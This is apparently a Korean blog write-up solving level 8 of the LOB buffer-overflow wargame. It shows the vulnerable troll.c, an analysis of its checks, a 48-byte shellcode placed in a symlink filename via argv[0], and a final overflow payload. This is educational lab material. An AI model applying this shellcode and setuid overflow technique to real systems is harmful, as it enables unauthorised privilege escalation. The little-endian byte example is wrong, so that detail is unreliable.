---
title: BOF/ LOB-level8(troll)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식이다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 8(orge)
**ID : orge**  
**PASSWD : timewalker**  

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level8/1.PNG)  
사용자 troll의 권한의 troll파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 troll의 권한으로 파일을 실행할 수 있다.**  
**troll파일이 쉘을 실행시키도록 한다면 사용자 troll의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}
{% endhighlight %}  
**troll.c**

### 소스분석  
1. argc가 2가 아닌경우 "ergv must be two!"를 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개의 인자를 전달하여야 한다.**  
**[LOB(level5)](https://limjunho.github.io/2019/11/03/LOB-level5(orc).html#lob-level-5orc)와 같이 argv[2]를 이용한 공격 불가**  
2. 환경변수를 memset으로 초기화  
**환경변수를 이용한 공격 불가**  
3. argv[1][47]의 값이 \xbf가 아닌경우 "stack is still your friend" 출력 후 프로그램 종료  
**RTL기법 사용 불가 What is RTL? - [LOB(level13)](https://limjunho.github.io/2020/03/14/LOB-level13(darkknight).html)**  
5. argv[1]의 길이가 48보다 큰 경우 "argument is too long!"을 출력 후 프로그램 종료  
**RET뒤에 NOP과 ShellCode를 삽입하는 공격 불가**  
6. main에 전달받은 인자 argv[1]을 buffer에 복사하여 출력(argv[0]은 파일명)  
**strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 40Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  
7. memset으로 buffer를 모두 0으로 초기화  
**buffer에 쉘코드를 전달하고 buffer의 주소를 BOF시키는 공격 불가**  
8. memset으로 argv[1]을 모두 0으로 초기화  
**[LOB(level6)](https://limjunho.github.io/2019/11/03/LOB-level6(wolfman).html)와 같이 argv[1]의 주소를 이용한 공격 불가**

### Solution  
**[LOB(level6)](https://limjunho.github.io/2019/11/03/LOB-level6(wolfman).html)와 매우 유사한 풀이이다.**  
**단, argv[1]을 사용할 수 없기 때문에 argv[0] 즉 파일명에 쉘코드를 전달하고 argv[0]의 주소를 buffer over-flow공격**  

**심벌릭링크?**  
링크를 연결하여 원본 파일을 직접 사용하는 것과 같은 효과를 내는 링크이다. 윈도우의 바로가기와 비슷한 개념  

#### level8에서 사용한 쉘코드  
**\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81**  
**48Byte**  
이번 문제에서 사용하는 쉘코드는 전과 달리 2f가 없도록 작성되었다. -> \x2f는 ascii 코드로 / 를 뜻한다.  
**Linux에서 파일명에 /는 경로를 의미하기 때문에 shellcode에 2f가 있다면 정상적인 공격이 어려움**  

**buffer over-flow를 이용하기 위해서는 프로그램 Stack의 구조를 알아야 한다.**  

스택구조|
---|
buffer(40Byte)|
sfp(4Byte)|
ret(4Byte)| 

**SFP(Stack frame pointer) - 이전 함수의 EBP주소를 담고 있다.**  
(EBP - 스택의 가장 바닥을 가리키는 포인터)  
**RET(Return Address) - 함수가 종료시 return될 주소**  

#### 기존 troll.c를 복사하여 argv[0]의 주소를 출력하는 코드를 추가.   
**buffer와 argv[1]을 초기화하고 main에 더 이상의 인자를 주지 못하지만 argv[0]은 초기화하지 않기 때문에 이를 이용**   

{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
        printf("%p\n", argv[0]);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}
{% endhighlight %}  
**troll.c를 복사하여 소스 추가 -> printf("%p\n", argv[0]);**  


![그림2](/assets/LOB/level8/2.PNG)  
위의 방법으로 argv[0]의 주소를 획득.  
argv[0]의 주소 -> 0xbffffbcd  

**파일명의 길이가 원본 실행파일(troll)의 심벌릭링크와 길이가 같아야 한다.**  
argv[0]의 길이가 다르면 원본파일의 argv[0]의 주소와 다른 주소를 얻을 수 있기 때문.  


![그림3](/assets/LOB/level8/3.PNG)  
set-uid가 걸린 원본파일에 쉘코드를 이름으로 심벌릭링크 등록  

### Attack  

argv[0]의 주소와 스택의 구조를 파악하였으므로 공격을 시도할 수 있다.  
**./troll + [dummy] + [argv(0)주소]**의 형태로 공격.  
**이 때 dummy값의 길이는 buffer의 길이 + sfp(4byte)만큼 즉 44Byte여야 한다.**  
**또한 RET에 덮을 argv[0]의 주소는 리틀 엔디안 방식으로 기입한다.**  

**리틀 엔디안은 최 하위 바이트 부터 저장하는 방식이다.**  
ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.  
보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  

![그림4](/assets/LOB/level8/4.PNG)  
공격 성공.   

**페이로드**  
```bash
$ ./`python -c "print '\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44 + '\xcd\xfb\xff\xbf'"`
```